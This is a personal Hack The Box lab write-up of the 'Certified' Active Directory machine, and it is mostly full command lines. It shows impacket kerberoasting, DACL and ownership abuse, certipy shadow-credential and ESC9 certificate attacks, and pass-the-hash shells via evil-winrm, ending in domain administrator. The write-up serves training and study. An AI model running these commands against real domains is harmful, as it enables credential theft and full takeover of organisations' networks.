#HTB #ESC9 #AD

**OS:** Windows  
**Date:** 11th of August

## Executive summary
In this box we are granted initial credentials to a low level user. Using Bloodhound, a chain was created where the user could make itself to the owner of the management group, then add itself to said group. The shadow credentials attack could then be used to grant a tgt with the management_svc user, essentially taking over this account. The same attack was possible to conduct with the management_svc user to take over the ca_operator user. Using ca_operator, we were able to find out that certificate templates were vulnerable to the ESC9 attack. The result of this attack was control of the administrator account.

## Enumeration
Our initial scans yields these open ports at the target host:

![264](Images/Pasted%20image%2020260811075320.png)

Since we are starting with creds, we attempt to authenticate against running services. We attempt to list users with smb which we save to a username list:
```
netexec smb $target -u judith.mader -p 'judith09' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}'  | tee users
```

![](Images/Pasted%20image%2020260811081227.png)

We also check shares by running:

```
netexec smb $target -u 'judith.mader' -p 'judith09' --shares
```

![](Images/Pasted%20image%2020260811081443.png)

We only see default shares, which we can check later unless something else yields better results. We then attempt asreproasting, which fails:

![565](Images/Pasted%20image%2020260811080958.png)
  
We download the bloodhound file:
```
sudo netexec ldap $target -u judith.mader -p 'judith09' --bloodhound --collection All --dns-server $target
```

![](Images/Pasted%20image%2020260811081054.png)

We will not use this now, but we will keep it for later as we will probably need it for further enumeration and later privesc.

We can also attempt kerberoasting:

```
impacket-GetUserSPNs -dc-ip $target 'certified.htb/judith.mader:judith09' -request
```

![](Images/Pasted%20image%2020260811093235.png)

It does not work because the clock skew is too great. That means that there is too great of a difference between the attacker and the victims datetime. We attempt to spam NTP updates to get closer and closer to the target:

```
sudo rdate -n $target

```
and 
```
sudo ntpdate $target
```
and then 
```
impacket-GetUserSPNs -dc-ip $target 'certified.htb/judith.mader:judith09' -request
```
After attempting these a few times, it works:

![469](Images/Pasted%20image%2020260811093541.png)

We now have a hash for the management_svc user we can attempt to crack.
We attempt with 3 large wordlists, which all fail. Let's sidebar this hash for now and check for other possibilities.

We can check for certificate misconfigurations with certify:
```
certipy-ad find -u judith.mader@certified.htb -p 'judith09' -dc-ip $target  -vulnerable -stdout
```

![408](Images/Pasted%20image%2020260811101323.png)

There are no immediately interesting things here, so then we go further with Bloodhound.

After starting an instance of Bloodhound and ingesting the file and setting judith.mader to owned, we can query Bloodhound for shortest path from owned objects for example:

![605](Images/Pasted%20image%2020260811102920.png)

We have a possible path forward. We have WriteOwner privileges to the Managment group. We can use the walkthrough that Bloodhound suggests:

![537](Images/Pasted%20image%2020260811105339.png)
## Exploitation

We follow the suggestions by running:
```
impacket-owneredit -action write -new-owner 'judith.mader' -target 'MANAGEMENT' 'CERTIFIED.HTB'/'judith.mader':'judith09'
```

![](Images/Pasted%20image%2020260811105743.png)

It works, so then we follow the next step, which is to grant the user the "AddMember" right so that we can add judith.mader to the group. 
```
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'CERTIFIED.HTB'/'judith.mader':'judith09'
```

![](Images/Pasted%20image%2020260811110344.png)

Now that we have the rights, we can add judith to the group:
```
net rpc group addmem "MANAGEMENT" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "certified.htb"
```

It seems to work, but let's verify it with:
```
net rpc group members "Management" -U "certified.htb"/"judith.mader"%"judith09" -S "certified.htb"
```

![](Images/Pasted%20image%2020260811111110.png)

And we see that judith.mader is now a member. Depending on the settings, these new settings may not be persistent and if they are deleted we have to do it again.

Following the next step in the chain, which is getting control of management_svc, which we previously fetched a hash we did not crack. That means that if we are able to get control of this account, we no longer need the judith user since we will have credentials (or hash). Here is the next step:

![](Images/Pasted%20image%2020260811113416.png)

We have two options here, targeted kerberoast or shadow credential attack. We have already attempted Kerberoast, so we go for the shadow credential attack. 

We try to request a tgt for management_svc with judith:
```
certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc
```

![](Images/Pasted%20image%2020260811113627.png)

It works, but the clock skew is too great. That means we have to update our time against the target NTP again.

After spamming attempting syncing a lot of times, we bruteforce it with:
```
faketime -f "2026-08-11 12:57:00" certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc
```

![293](Images/Pasted%20image%2020260811120405.png)

This finally works and we have the nt hash for the management_svc user. With this, we can perform pass-the-hash attacks and we update ownership of this user in Bloodhound.

We attempt to authenicate to different services: ldap, smb and winrm. It has the same rights as judith in regards to shares over smb, but over winrm we are able to spawn a shell:

![](Images/Pasted%20image%2020260811121500.png)

We spawn a shell with:
```
evil-winrm -u management_svc -H a091c1832*********** -i $target
```

![232](Images/Pasted%20image%2020260811123059.png)

Nothing immediately interesting here, but we go to the desktop and fetch the flag.

![](Images/Pasted%20image%2020260811123210.png)

We could further enumerate with this user or we could get to the end of the path that Bloodhound put us on. We Bloodhound first and we can come back to this user later if need be.
As we see, we can use the same attack as in the previous chain to get to the CA_OPERATOR user:

![494](Images/Pasted%20image%2020260811123817.png)

We need the clock to be properly synced, so we attempt to do 
```
sudo rdate -n $target
```

It lists the current time, which we put into faketime to bypass the sync issues

```
faketime -f "2026-08-11 13:42:00" certipy-ad shadow auto -u management_svc@certified.htb -hashes a091c1832************ -account ca_operator
```

![432](Images/Pasted%20image%2020260811124833.png)

It grants us the nt hash for ca_operator.

With that hash we can again attempt to authenticate to other services or check for possible privesc possibilities. We check ldap, winrm and smb:

![](Images/Pasted%20image%2020260811182337.png)

as we see, there are no additional rights for smb on this user, but authentication does work as well as for ldap. This user does not have access to winrm, so authentication fails there. We check again for certificate vulnerabilities with 
```
certipy-ad find -u 'ca_operator' -hashes :b4b86f45c************* -dc-ip $target -stdout -vulnerable
```

![](Images/Pasted%20image%2020260811182630.png)

We see that it may be vulnerable to ESC9.

## Post-Exploitation (Privilege Escalation)
What happens is that we can forge an update to apply a user to temporarily be read as the administrator by changing the UPN to Administrator first, request a ticket and then revert it back and then tricking the KDC to grant a tgt to that user masquerading (kind of) as the administrator.


```
certipy-ad account -u 'management_svc@certified.htb' -hashes :a091c183****** -dc-ip $target -upn 'Administrator' -user 'ca_operator' update
```

![](Images/Pasted%20image%2020260811184145.png)

As we see, that worked. Let's now read it:
```
certipy-ad account -u 'management_svc' -hashes :a091c183****** -dc-ip $target -user 'ca_operator' read
```

![](Images/Pasted%20image%2020260811184217.png)

As we see, the ca_operator user has been updated with a UPN of Administrator. We can now request the certificate with the incorrect UPN:

```
certipy-ad req -u 'ca_operator@certified.htb' -hashes b4b86f****** -dc-ip $target -target 'DC01.certified.htb' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
```
the -target flag is the DNS name record from the output earlier while the -ca flag is CA NAME

![](Images/Pasted%20image%2020260811185141.png)

We now revert ca_operator back to its original UPN:
```
certipy-ad account -u 'management_svc@certified.htb' -hashes :a091c1832****** -dc-ip $target -upn 'ca_operator@certified.htb' -user 'ca_operator' update
```

![](Images/Pasted%20image%2020260811185344.png)

We can now attempt to get the nt hash for the administrator:
```
certipy-ad auth -dc-ip $target -pfx 'administrator.pfx' -username 'Administrator' -domain certified.htb
```

![](Images/Pasted%20image%2020260811185707.png)

It works, but the clock skew is once again too great. After ntp and faketiming, we attempt again:
```
faketime -f "2026-08-11 19:59:00" certipy-ad auth -dc-ip $target -pfx 'administrator.pfx' -username 'Administrator' -domain certified.htb
```

![](Images/Pasted%20image%2020260811185910.png)

And we have obtained the nt hash for the administrator. We can now check if we are the administrator with a pass the hash attack:
```
netexec winrm $target -u 'administrator' -H 0d5b496******
```

![](Images/Pasted%20image%2020260811190141.png)

And we are able to spawn a shell with winrm, which we do:
```
evil-winrm -u administrator -H 0d5b496***** -i $target
```

![](Images/Pasted%20image%2020260811190310.png)

We fetch the flag and could now print all hashes for all users, create persistence or other villainous stuff. We are not villains, so are happy with yet another root.



## Findings and Flags
In this section, finding from various sources gets collected, typically usernames, hashes, credentials or similar.

 Domain: certified.htb
 

#### Usernames:Passwords

judith.mader:judith09


Hashes:

management_svc:a091c1***************
ca_operator:b4b86f********
Administrator: 0d5b49******


